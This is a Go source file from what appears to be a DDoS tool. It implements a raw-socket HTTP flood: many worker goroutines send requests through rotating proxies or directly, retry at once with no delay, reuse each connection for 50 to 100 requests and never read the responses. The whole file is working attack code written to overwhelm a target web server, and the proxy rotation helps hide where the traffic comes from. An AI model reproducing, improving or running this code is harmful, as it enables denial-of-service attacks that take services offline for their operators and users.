package ddos

import (
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"sync/atomic"
	"time"
)

// startRawSocketAttack starts raw socket attack
func (d *DDoSAttack) startRawSocketAttack() {
	d.startRawSocketWorkers(d.config.MaxThreads)
}

// startRawSocketWorkers starts raw socket workers
func (d *DDoSAttack) startRawSocketWorkers(numWorkers int) {
	// Determine if we should use TLS
	useTLS, _, targetURL := d.shouldUseTLS(d.config.TargetURL)
	host, port, _ := d.parseTargetURL(targetURL, useTLS)

	// Create request builder
	if d.requestBuilder == nil {
		d.requestBuilder = NewRequestBuilder(d.config)
	}

	for i := 0; i < numWorkers; i++ {
		d.wg.Add(1)
		go d.rawSocketWorker(host, port, useTLS)
	}
}

// rawSocketWorker performs raw socket attack
func (d *DDoSAttack) rawSocketWorker(host, port string, useTLS bool) {
	defer func() {
		// Recover from panics to prevent worker crashes
		if r := recover(); r != nil {
			atomic.AddInt64(&d.requestsFailed, 1)
		}
		d.wg.Done()
	}()

	// Check if context is initialized
	if d.ctx == nil {
		return
	}

	for {
		select {
		case <-d.ctx.Done():
			return
		default:
			d.rawSocketConnection(host, port, useTLS)
			// Removed delay for maximum throughput - immediate retry
			// Context check only to allow graceful shutdown
		}
	}
}

// rawSocketConnection creates a raw socket connection and sends requests
func (d *DDoSAttack) rawSocketConnection(host, port string, useTLS bool) {
	defer func() {
		// Recover from panics in connection handling
		if r := recover(); r != nil {
			atomic.AddInt64(&d.requestsFailed, 1)
		}
	}()

	atomic.AddInt64(&d.activeConns, 1)
	defer atomic.AddInt64(&d.activeConns, -1)

	// Ensure requestBuilder is initialized
	if d.requestBuilder == nil {
		d.requestBuilder = NewRequestBuilder(d.config)
	}

	// Connect with optimized dialer for connection reuse
	var conn net.Conn
	var err error
	var usedProxy string

	dialer := &net.Dialer{
		Timeout:   d.config.Timeout,
		KeepAlive: 30 * time.Second, // Keep connections alive for reuse
		DualStack: true,             // Enable dual-stack for better connectivity
	}

	// Proxy support for raw socket (use optimized proxy manager)
	if d.proxyManager != nil {
		if proxyURL, ok := d.getNextProxy(); ok {
			usedProxy = proxyURL
			conn, err = d.dialThroughHTTPProxy(dialer, proxyURL, host, port, useTLS)
		}
	}

	// Fallback to direct connection with retry logic
	if conn == nil && err == nil {
		maxRetries := 2 // Retry connection up to 2 times
		for retry := 0; retry < maxRetries; retry++ {
			if useTLS {
				tlsConfig := d.createTLSConfig()
				conn, err = tls.DialWithDialer(dialer, "tcp", host+":"+port, tlsConfig)
			} else {
				conn, err = dialer.Dial("tcp", host+":"+port)
			}

			if err == nil {
				break // Success
			}

			// Exponential backoff for retries
			if retry < maxRetries-1 {
				select {
				case <-d.ctx.Done():
					return
				case <-time.After(time.Duration(retry+1) * 100 * time.Millisecond):
				}
			}
		}
	}

	startTime := time.Now()
	if err != nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		if usedProxy != "" {
			d.markProxyFailure(usedProxy)
		}
		// Add retry logic with exponential backoff for connection errors
		// This helps recover from transient connection failures
		return
	}

	// Set connection timeouts for better error detection
	conn.SetWriteDeadline(time.Now().Add(d.config.Timeout))
	conn.SetReadDeadline(time.Now().Add(d.config.Timeout))
	// Don't defer close immediately - try to reuse connection for multiple requests
	// Close will be handled after sending multiple requests or on error

	if usedProxy != "" {
		responseTime := time.Since(startTime)
		d.markProxySuccess(usedProxy, responseTime)
	}

	// Build and send raw HTTP request - safe type assertion
	rb, ok := d.requestBuilder.(*RequestBuilder)
	if !ok || rb == nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		conn.Close()
		return
	}

	// Send multiple requests on the same connection for better efficiency
	// Increased from 10 to improve connection reuse at high concurrency
	requestsPerConn := 50 // Reuse connection for more requests to reduce connection overhead
	if d.config.MaxThreads > 1000 {
		requestsPerConn = 100 // Even more reuse for very high concurrency
	}

	// Track connection health
	connectionHealthy := true
	for i := 0; i < requestsPerConn && connectionHealthy; i++ {
		// Check context before each request
		select {
		case <-d.ctx.Done():
			conn.Close()
			return
		default:
		}

		// Rate limiting: check if request is allowed
		if d.rateLimiter != nil && !d.rateLimiter.Allow() {
			atomic.AddInt64(&d.requestsFailed, 1)
			continue
		}

		req, err := rb.BuildRequest()
		if err != nil {
			atomic.AddInt64(&d.requestsFailed, 1)
			continue
		}

		httpRequest := buildRawHTTPRequest(req, host)
		if httpRequest == nil {
			atomic.AddInt64(&d.requestsFailed, 1)
			continue
		}

		atomic.AddInt64(&d.requestsSent, 1)
		atomic.AddInt64(&d.bytesSent, int64(len(httpRequest)))

		// Send request with error handling and retry
		_, err = conn.Write(httpRequest)
		if err != nil {
			atomic.AddInt64(&d.requestsFailed, 1)
			connectionHealthy = false
			// Close connection on write error
			conn.Close()
			break // Exit loop to reconnect
		}

		// Always skip response reading for maximum efficiency
		atomic.AddInt64(&d.requestsSuccess, 1)

		// Check connection health periodically (every 10 requests)
		if i > 0 && i%10 == 0 {
			// Lightweight health check: try to set a write deadline
			// If connection is dead, this will help detect it
			if err := conn.SetWriteDeadline(time.Now().Add(100 * time.Millisecond)); err != nil {
				connectionHealthy = false
				conn.Close()
				break
			}
			// Reset deadline
			conn.SetWriteDeadline(time.Time{})
		}
	}

	// Close connection after reusing it for multiple requests
	conn.Close()
}

// buildRawHTTPRequest converts an HTTP request to raw bytes (enhanced for POST support)
func buildRawHTTPRequest(req *http.Request, host string) []byte {
	// Build request line
	requestLine := fmt.Sprintf("%s %s HTTP/1.1\r\n", req.Method, req.URL.RequestURI())

	// Build headers
	headers := requestLine
	headers += fmt.Sprintf("Host: %s\r\n", host)

	for key, values := range req.Header {
		for _, value := range values {
			headers += fmt.Sprintf("%s: %s\r\n", key, value)
		}
	}

	// Add Content-Length for POST/PUT requests if body exists
	var bodyData []byte
	if req.Body != nil {
		// Try to get a fresh copy of the body using GetBody() if available
		if req.GetBody != nil {
			if body, err := req.GetBody(); err == nil {
				if bodyBytes, err := io.ReadAll(body); err == nil {
					bodyData = bodyBytes
					headers += fmt.Sprintf("Content-Length: %d\r\n", len(bodyData))
				}
			}
		} else {
			// Fallback: try to read from Body directly (may fail if already read)
			if bodyBytes, err := io.ReadAll(req.Body); err == nil {
				bodyData = bodyBytes
				headers += fmt.Sprintf("Content-Length: %d\r\n", len(bodyData))
			}
		}
	}

	headers += "\r\n"

	// Combine headers and body
	result := []byte(headers)
	if len(bodyData) > 0 {
		result = append(result, bodyData...)
	}

	return result
}
